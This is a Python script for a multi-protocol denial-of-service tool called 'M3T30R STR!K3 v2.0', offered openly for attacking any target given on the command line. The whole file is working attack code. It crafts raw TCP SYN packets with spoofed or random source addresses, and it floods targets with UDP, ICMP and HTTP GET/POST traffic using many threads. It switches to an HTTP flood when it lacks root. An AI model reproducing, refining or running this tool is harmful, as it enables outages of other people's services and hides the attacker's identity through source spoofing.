#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
M3T30R STR!K3 v2.0 - Multi‑Protocol Denial‑of‑Service Engine
Now with root detection, fallback, and verbose logging.
"""

import sys
import os
import time
import random
import socket
import struct
import threading
import argparse
import requests
from concurrent.futures import ThreadPoolExecutor

# ==================== ASCII BANNER (2 lines) ====================
BANNER = """
 ███╗   ███╗████████╗████████╗███████╗██████╗  ██████╗ ██████╗     ███████╗████████╗██████╗ ██╗██╗  ██╗███████╗
 ████╗ ████║╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗██╔═══██╗██╔══██╗    ██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
 ██╔████╔██║   ██║      ██║   █████╗  ██████╔╝██║   ██║██████╔╝    ███████╗   ██║   ██████╔╝██║█████╔╝ ███████╗
 ██║╚██╔╝██║   ██║      ██║   ██╔══╝  ██╔══██╗██║   ██║██╔══██╗    ╚════██║   ██║   ██╔══██╗██║██╔═██╗ ╚════██║
 ██║ ╚═╝ ██║   ██║      ██║   ███████╗██║  ██║╚██████╔╝██║  ██║    ███████║   ██║   ██║  ██║██║██║  ██╗███████║
 ╚═╝     ╚═╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
"""

# ==================== ATTACK ENGINE ====================
class MeteorStrike:
    def __init__(self, target, port, protocol, threads, duration, payload_size, spoof, verbose=False):
        self.target = target
        self.port = port
        self.protocol = protocol.lower()
        self.threads = threads
        self.duration = duration
        self.payload_size = payload_size
        self.spoof = spoof
        self.verbose = verbose
        self.running = True
        self.sent = 0
        self.lock = threading.Lock()

        try:
            self.target_ip = socket.gethostbyname(target)
        except:
            self.target_ip = target
        self.target_ip_bytes = socket.inet_aton(self.target_ip)

        # Check if we are root (for raw sockets)
        self.is_root = os.geteuid() == 0
        if not self.is_root and self.protocol != "http":
            print("[!] WARNING: Not running as root. Raw socket attacks (TCP/UDP/ICMP) will fail.")
            print("[!] Switching to HTTP flood (no privileges required).")
            self.protocol = "http"
            self.port = 80 if self.port == 0 else self.port

    def _log(self, msg):
        if self.verbose:
            print(f"[V] {msg}")

    def _tcp_syn_flood(self):
        """TCP SYN flood - raw socket (requires root)"""
        if not self.is_root:
            print("[!] TCP SYN flood requires root. Skipping.")
            return
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            print("[!] Raw socket creation failed. Run with sudo.")
            return
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        while self.running:
            try:
                ip_ihl = 5
                ip_ver = 4
                ip_tos = 0
                ip_tot_len = 40
                ip_id = random.randint(1, 65535)
                ip_frag_off = 0
                ip_ttl = 255
                ip_proto = socket.IPPROTO_TCP
                ip_check = 0
                ip_saddr = socket.inet_aton(self.spoof if self.spoof else self._random_ip())
                ip_daddr = self.target_ip_bytes

                ip_header = struct.pack('!BBHHHBBH4s4s',
                                        (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
                                        ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
                                        ip_saddr, ip_daddr)

                tcp_src = random.randint(1024, 65535)
                tcp_dst = self.port
                tcp_seq = random.randint(0, 4294967295)
                tcp_ack_seq = 0
                tcp_doff = 5
                tcp_flags = 0x02
                tcp_window = socket.htons(5840)
                tcp_check = 0
                tcp_urg_ptr = 0
                tcp_offset_res = (tcp_doff << 4) + 0
                tcp_header = struct.pack('!HHLLBBHHH',
                                         tcp_src, tcp_dst, tcp_seq, tcp_ack_seq,
                                         tcp_offset_res, tcp_flags, tcp_window,
                                         tcp_check, tcp_urg_ptr)

                packet = ip_header + tcp_header
                sock.sendto(packet, (self.target_ip, 0))
                with self.lock:
                    self.sent += 1
                    if self.sent % 1000 == 0:
                        self._log(f"Sent {self.sent} TCP SYN packets")
            except Exception as e:
                if self.verbose:
                    print(f"[!] TCP error: {e}")

    def _udp_flood(self):
        """UDP flood - requires root for raw, but can use normal socket"""
        # Use standard UDP socket – no root needed for sending to port
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(self.payload_size)
        while self.running:
            try:
                sock.sendto(payload, (self.target_ip, self.port))
                with self.lock:
                    self.sent += 1
                    if self.sent % 1000 == 0:
                        self._log(f"Sent {self.sent} UDP packets")
            except Exception as e:
                if self.verbose:
                    print(f"[!] UDP error: {e}")

    def _icmp_flood(self):
        """ICMP flood - requires root"""
        if not self.is_root:
            print("[!] ICMP flood requires root. Skipping.")
            return
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            print("[!] Raw ICMP socket requires root. Skipping.")
            return

        icmp_type = 8
        icmp_code = 0
        icmp_check = 0
        icmp_id = random.randint(1, 65535)
        icmp_seq = 1
        payload = random._urandom(self.payload_size - 8)

        while self.running:
            try:
                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)
                icmp_check = self._checksum(icmp_header + payload)
                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)
                packet = icmp_header + payload
                sock.sendto(packet, (self.target_ip, 0))
                with self.lock:
                    self.sent += 1
                    if self.sent % 1000 == 0:
                        self._log(f"Sent {self.sent} ICMP packets")
                icmp_seq += 1
            except Exception as e:
                if self.verbose:
                    print(f"[!] ICMP error: {e}")

    def _checksum(self, data):
        if len(data) % 2 != 0:
            data += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(data)//2), data))
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

    def _http_flood(self):
        """HTTP flood - no privileges required"""
        session = requests.Session()
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        url = f"http://{self.target}" if self.port == 80 else f"http://{self.target}:{self.port}"
        if self.port == 443:
            url = f"https://{self.target}"

        while self.running:
            try:
                if random.choice([0,1]) == 0:
                    session.get(url, headers=headers, timeout=2)
                else:
                    session.post(url, data={"data": random._urandom(100)}, headers=headers, timeout=2)
                with self.lock:
                    self.sent += 1
                    if self.sent % 100 == 0:
                        self._log(f"Sent {self.sent} HTTP requests")
            except Exception as e:
                if self.verbose:
                    print(f"[!] HTTP error: {e}")

    def _random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

    def start(self):
        print(f"[+] Launching M3T30R STR!K3 on {self.target}:{self.port} ({self.protocol.upper()})")
        print(f"[+] Threads: {self.threads} | Duration: {self.duration}s | Payload: {self.payload_size}B")
        print("[+] Press Ctrl+C to stop early.\n")

        attack_funcs = {
            "tcp": self._tcp_syn_flood,
            "udp": self._udp_flood,
            "icmp": self._icmp_flood,
            "http": self._http_flood
        }
        attack = attack_funcs.get(self.protocol, self._http_flood)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(attack) for _ in range(self.threads)]
            time.sleep(self.duration)
            self.running = False
            for f in futures:
                f.cancel()

        print(f"\n[+] Attack finished. Total packets sent: {self.sent}")

def main():
    parser = argparse.ArgumentParser(description="M3T30R STR!K3 - Multi‑Protocol DoS")
    parser.add_argument("--target", "-t", required=True, help="Target IP or domain")
    parser.add_argument("--port", "-p", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--protocol", "-P", choices=["tcp","udp","icmp","http"], default="tcp", help="Protocol (default: tcp)")
    parser.add_argument("--threads", "-T", type=int, default=50, help="Threads (default: 50)")
    parser.add_argument("--duration", "-d", type=int, default=30, help="Attack duration in seconds (default: 30)")
    parser.add_argument("--payload", "-s", type=int, default=1024, help="Payload size in bytes (default: 1024)")
    parser.add_argument("--spoof", "-S", help="Spoofed source IP (optional)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    args = parser.parse_args()

    print(BANNER)
    print("\n" + "="*60)
    print("  M3T30R STR!K3 v2.0 – Unleash the storm")
    print("="*60 + "\n")

    strike = MeteorStrike(
        target=args.target,
        port=args.port,
        protocol=args.protocol,
        threads=args.threads,
        duration=args.duration,
        payload_size=args.payload,
        spoof=args.spoof,
        verbose=args.verbose
    )
    strike.start()

if __name__ == "__main__":
    main()
